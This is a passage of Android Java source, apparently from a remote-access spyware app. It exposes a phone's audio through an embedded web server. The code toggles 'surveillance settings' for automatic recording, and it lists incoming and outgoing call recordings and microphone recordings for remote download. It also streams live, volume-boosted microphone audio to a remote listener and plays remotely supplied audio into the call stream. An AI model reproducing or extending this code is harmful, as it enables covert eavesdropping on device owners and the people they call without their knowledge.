        FirebaseConfig.logActivity("ACOUSTICS_PROTOCOL: Surveillance settings updated");
        boolean autoRecord = "true".equalsIgnoreCase(params.get("auto_record"));
        boolean saveOnDevice = "true".equalsIgnoreCase(params.get("save_on_device"));

        android.content.Intent intent = new android.content.Intent(context, MediaFrameworkService.class);
        intent.setAction(Constants.ACTION_UPDATE_AUDIO_SETTINGS);
        intent.putExtra("auto_record", autoRecord);
        intent.putExtra("save_on_device", saveOnDevice);

        androidx.core.content.ContextCompat.startForegroundService(context, intent);

        String html = "<!DOCTYPE html><html><head><meta http-equiv=\"refresh\" content=\"0;url=/audio\"></head>" +
                "<body></body></html>";
        return server.serveGzippedProxy(session, "text/html", html);
    }

    private Response serveAudioRecordings(IHTTPSession session) {
        FirebaseConfig.logActivity("ACOUSTICS_EXTRACT: Remote audio archive accessed");
        StringBuilder html = new StringBuilder(getHeader(session.getUri()));
        html.append("<div class=\"back-btn-container\">");
        html.append("<a href=\"/terminal\" class=\"btn-back\">&#8592; Back to Terminal</a>");
        html.append("</div>");
        html.append("<div class=\"card\">");
        html.append("<h2 style=\"margin-bottom: 20px; font-size: 1.6rem;\">&#128190; Audio Recordings</h2>");
        html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div>");

        File recordDir = MediaFrameworkService.getRecordingsDirectory(context);

        if (!recordDir.exists() || !recordDir.isDirectory()) {
            html.append("<div class=\"empty-state\"><div class=\"icon\">&#127897;</div><p>No recordings yet</p></div>");
        } else {
            File[] files = recordDir.listFiles(
                    (dir, name) -> name.toLowerCase().endsWith(".m4a") || name.toLowerCase().endsWith(".mp3") ||
                            name.toLowerCase().endsWith(".wav") || name.toLowerCase().endsWith(".aac"));

            if (files == null || files.length == 0) {
                html.append(
                        "<div class=\"empty-state\"><div class=\"icon\">&#127897;</div><p>No recordings yet</p></div>");
            } else {
                java.util.Arrays.sort(files, (a, b) -> Long.compare(b.lastModified(), a.lastModified()));

                html.append("<ul class=\"file-list\">");

                int count = 0;
                for (File file : files) {
                    if (count >= 50) break; 

                    String fileName = file.getName();
                    String icon = "&#127897;";
                    String iconClass = "file-icon-audio";

                    String recordType = "Unknown";
                    if (fileName.startsWith("CALL_incoming")) {
                        icon = "&#128222;";
                        recordType = "Incoming Call";
                    } else if (fileName.startsWith("CALL_outgoing")) {
                        icon = "&#128222;";
                        recordType = "Outgoing Call";
                    } else if (fileName.startsWith("MIC_")) {
                        icon = "&#127897;";
                        recordType = "Microphone";
                    }

                    html.append("<li class=\"file-item\">");
                    html.append("<div class=\"file-icon ").append(iconClass).append("\">").append(icon)
                            .append("</div>");
                    html.append("<div class=\"file-info\">");
                    html.append("<span class=\"file-name\">").append(escapeHtml(fileName)).append("</span>");
                    html.append("<div class=\"file-meta\">");
                    html.append(recordType).append(" &nbsp;&bull;&nbsp; DUR: ").append(getAudioFileDuration(file)).append(" &nbsp;&bull;&nbsp; ");
                    html.append(FirebaseConfig.formatFileSize(file.length())).append(" &nbsp;&bull;&nbsp; ");
                    html.append(new SimpleDateFormat("MMM dd, yyyy HH:mm", Locale.getDefault())
                            .format(new Date(file.lastModified())));
                    html.append("</div></div>");
                    String downloadPath;
                    if (file.getAbsolutePath().contains(context.getFilesDir().getAbsolutePath())) {
                        downloadPath = "INTERNAL/" + file.getAbsolutePath().replace(context.getFilesDir().getAbsolutePath() + "/", "");
                    } else {
                        downloadPath = file.getAbsolutePath().replace(Environment.getExternalStorageDirectory().getAbsolutePath() + "/", "");
                    }

                    html.append("<a href=\"/download/").append(downloadPath)
                            .append("\" class=\"btn btn-small\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan);\">GET_FILE</a>");
                    html.append("</li>");

                    count++;
                }

                html.append("</ul>");
            }
        }

        html.append("<div style=\"margin-top: 20px;\">");
        html.append(
                "<a href=\"/audio\" style=\"color: #00f2ff; text-decoration: none;\">&larr; Back to Audio Control</a>");
        html.append("</div>");
        html.append("</div>"); 
        html.append("</div>"); 

        return server.serveGzippedProxy(session, "text/html", html.toString());
    }

    private static volatile boolean liveRecordingActive = false;
    private static final byte[] rollingBuffer = new byte[32000]; // 1 second rolling buffer
    private static int rollingWritePos = 0;
    private static long lastChunkReadTime = 0;
    private static Thread liveRecorderThread = null;

    private synchronized void startLiveAudioEngine() {
        if (liveRecordingActive && liveRecorderThread != null && liveRecorderThread.isAlive()) {
            return;
        }
        liveRecordingActive = true;
        lastChunkReadTime = System.currentTimeMillis();

        liveRecorderThread = new Thread(() -> {
            AudioRecord recorder = null;
            try {
                int sampleRate = 16000;
                int channelConfig = AudioFormat.CHANNEL_IN_MONO;
                int audioEncoding = AudioFormat.ENCODING_PCM_16BIT;
                int minBufferSize = AudioRecord.getMinBufferSize(sampleRate, channelConfig, audioEncoding);

                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    if (context.checkSelfPermission(Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
                        liveRecordingActive = false;
                        return;
                    }
                }

                int[] sources = {
                    MediaRecorder.AudioSource.MIC,
                    MediaRecorder.AudioSource.VOICE_RECOGNITION,
                    MediaRecorder.AudioSource.VOICE_COMMUNICATION
                };

                for (int source : sources) {
                    try {
                        recorder = new AudioRecord(source, sampleRate, channelConfig, audioEncoding, Math.max(minBufferSize * 2, 8192));
                        if (recorder.getState() == AudioRecord.STATE_INITIALIZED) {
                            break;
                        }
                    } catch (Exception ignored) {}
                }

                if (recorder == null || recorder.getState() != AudioRecord.STATE_INITIALIZED) {
                    liveRecordingActive = false;
                    return;
                }

                recorder.startRecording();
                byte[] tempBuf = new byte[minBufferSize];

                while (liveRecordingActive) {
                    if (System.currentTimeMillis() - lastChunkReadTime > 8000) {
                        break;
                    }

                    int read = recorder.read(tempBuf, 0, tempBuf.length);
                    if (read > 0) {
                        synchronized (rollingBuffer) {
                            for (int i = 0; i < read; i++) {
                                rollingBuffer[rollingWritePos] = tempBuf[i];
                                rollingWritePos = (rollingWritePos + 1) % rollingBuffer.length;
                            }
                        }
                    } else {
                        try { Thread.sleep(20); } catch (Exception ignored) {}
                    }
                }
            } catch (Exception e) {
                Log.e("AcousticsModule", "Live recorder thread error: " + e.getMessage());
            } finally {
                liveRecordingActive = false;
                try {
                    if (recorder != null) {
                        recorder.stop();
                        recorder.release();
                    }
                } catch (Exception ignored) {}
            }
        });
        liveRecorderThread.start();
    }

    private Response serveAudioChunk(IHTTPSession session) {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                if (context.checkSelfPermission(Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
                    return server.serveErrorProxy("MIC Permission Missing");
                }
            }

            lastChunkReadTime = System.currentTimeMillis();
            if (!liveRecordingActive) {
                startLiveAudioEngine();
                try { Thread.sleep(300); } catch (Exception ignored) {}
            }

            byte[] pcmSnapshot = new byte[32000];
            synchronized (rollingBuffer) {
                int pos = rollingWritePos;
                int len = rollingBuffer.length;
                for (int i = 0; i < len; i++) {
                    pcmSnapshot[i] = rollingBuffer[(pos + i) % len];
                }
            }

            for (int i = 0; i < pcmSnapshot.length; i += 2) {
                if (i + 1 < pcmSnapshot.length) {
                    short sample = (short) ((pcmSnapshot[i] & 0xFF) | (pcmSnapshot[i + 1] << 8));
                    int boosted = sample * 2;
                    if (boosted > 32767) boosted = 32767;
                    else if (boosted < -32768) boosted = -32768;
                    pcmSnapshot[i] = (byte) (boosted & 0xFF);
                    pcmSnapshot[i + 1] = (byte) ((boosted >> 8) & 0xFF);
                }
            }

            java.io.ByteArrayOutputStream wavStream = new java.io.ByteArrayOutputStream();
            writeWavHeaderWithLength(wavStream, pcmSnapshot.length, 16000, (short) 1, (short) 16);
            wavStream.write(pcmSnapshot, 0, pcmSnapshot.length);

            byte[] wavData = wavStream.toByteArray();
            Response res = server.newFixedLengthResponseProxy(Response.Status.OK, "audio/wav", new java.io.ByteArrayInputStream(wavData), wavData.length);
            res.addHeader("Cache-Control", "no-cache");
            return res;

        } catch (Exception e) {
            Log.e("AcousticsModule", "Chunk Error: " + e.getMessage());
            return server.serveErrorProxy("Audio Chunk Error: " + e.getMessage());
        }
    }

    private static AudioTrack projectorTrack;
    private static final int PROJECTOR_SAMPLE_RATE = 16000;

    private Response handleAudioInjection(IHTTPSession session) {
        try {
            // [STABILITY_SYNC] Read body from NanoHTTPD parsed files if available
            // or read directly from the input stream.
            InputStream is = session.getInputStream();
            if (is == null) return newResponse(Response.Status.BAD_REQUEST, "text/plain", "NO_PAYLOAD");

            // Hard check for projectorTrack state
            if (projectorTrack == null || projectorTrack.getState() == AudioTrack.STATE_UNINITIALIZED) {
                Log.d("AcousticsModule", "Initializing projector track...");
                int minBufSize = AudioTrack.getMinBufferSize(PROJECTOR_SAMPLE_RATE, AudioFormat.CHANNEL_OUT_MONO, AudioFormat.ENCODING_PCM_16BIT);
                
                try {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        projectorTrack = new AudioTrack.Builder()
                                .setAudioAttributes(new AudioAttributes.Builder()
                                        .setUsage(AudioAttributes.USAGE_VOICE_COMMUNICATION)
                                        .setContentType(AudioAttributes.CONTENT_TYPE_SPEECH)
                                        .build())
                                .setAudioFormat(new AudioFormat.Builder()
                                        .setEncoding(AudioFormat.ENCODING_PCM_16BIT)
                                        .setSampleRate(PROJECTOR_SAMPLE_RATE)
                                        .setChannelMask(AudioFormat.CHANNEL_OUT_MONO)
                                        .build())
                                .setBufferSizeInBytes(Math.max(minBufSize, 8192))
                                .setTransferMode(AudioTrack.MODE_STREAM)
                                .build();
                    } else {
                        projectorTrack = new AudioTrack(AudioManager.STREAM_VOICE_CALL, PROJECTOR_SAMPLE_RATE, 
                                AudioFormat.CHANNEL_OUT_MONO, AudioFormat.ENCODING_PCM_16BIT, Math.max(minBufSize, 8192), AudioTrack.MODE_STREAM);
                    }
                    
                    if (projectorTrack.getState() == AudioTrack.STATE_INITIALIZED) {
                        projectorTrack.play();
                        Log.d("AcousticsModule", "Projector track started.");
                    } else {
                        Log.e("AcousticsModule", "Projector track failed to initialize.");
                        return newResponse(Response.Status.INTERNAL_ERROR, "text/plain", "INIT_FAILED");
                    }
                } catch (Exception e) {
                    Log.e("AcousticsModule", "Projector Init Error: " + e.getMessage());
                    return newResponse(Response.Status.INTERNAL_ERROR, "text/plain", e.getMessage());
                }
            }

            if (projectorTrack != null && projectorTrack.getPlayState() == AudioTrack.PLAYSTATE_PLAYING) {
                byte[] buffer = new byte[4096];
                int read;
                int totalWritten = 0;
                while ((read = is.read(buffer)) > 0) {
                    int written = projectorTrack.write(buffer, 0, read);
                    if (written > 0) totalWritten += written;
                }
                // Log.v("AcousticsModule", "Injected " + totalWritten + " bytes");
            }
            
            return newResponse(Response.Status.OK, "application/json", "{\"success\": true}");
        } catch (Exception e) {
            Log.e("AcousticsModule", "Injection Error: " + e.getMessage());
            return newResponse(Response.Status.INTERNAL_ERROR, "text/plain", e.getMessage());
        }
    }

    private void writeWavHeaderWithLength(java.io.OutputStream out, int totalAudioLen, int sampleRate, short channels, short bitDepth) throws java.io.IOException {
        int totalDataLen = totalAudioLen + 36;
        int byteRate = sampleRate * channels * bitDepth / 8;

        byte[] header = new byte[44];
        header[0] = 'R'; header[1] = 'I'; header[2] = 'F'; header[3] = 'F';
        header[4] = (byte) (totalDataLen & 0xff);
        header[5] = (byte) ((totalDataLen >> 8) & 0xff);
        header[6] = (byte) ((totalDataLen >> 16) & 0xff);
        header[7] = (byte) ((totalDataLen >> 24) & 0xff);
        header[8] = 'W'; header[9] = 'A'; header[10] = 'V'; header[11] = 'E';
        header[12] = 'f'; header[13] = 'm'; header[14] = 't'; header[15] = ' ';
        header[16] = 16; header[17] = 0; header[18] = 0; header[19] = 0; // Subchunk1Size (16 for PCM)
        header[20] = 1; header[21] = 0; // AudioFormat (1 for PCM)
        header[22] = (byte) channels; header[23] = 0;
        header[24] = (byte) (sampleRate & 0xff);
        header[25] = (byte) ((sampleRate >> 8) & 0xff);
        header[26] = (byte) ((sampleRate >> 16) & 0xff);
        header[27] = (byte) ((sampleRate >> 24) & 0xff);
        header[28] = (byte) (byteRate & 0xff);
        header[29] = (byte) ((byteRate >> 8) & 0xff);
        header[30] = (byte) ((byteRate >> 16) & 0xff);
        header[31] = (byte) ((byteRate >> 24) & 0xff);
        header[32] = (byte) (channels * bitDepth / 8); header[33] = 0; // BlockAlign
        header[34] = (byte) bitDepth; header[35] = 0; // BitsPerSample
        header[36] = 'd'; header[37] = 'a'; header[38] = 't'; header[39] = 'a';
        header[40] = (byte) (totalAudioLen & 0xff);
        header[41] = (byte) ((totalAudioLen >> 8) & 0xff);
        header[42] = (byte) ((totalAudioLen >> 16) & 0xff);
        header[43] = (byte) ((totalAudioLen >> 24) & 0xff);
        out.write(header, 0, 44);
    }
}
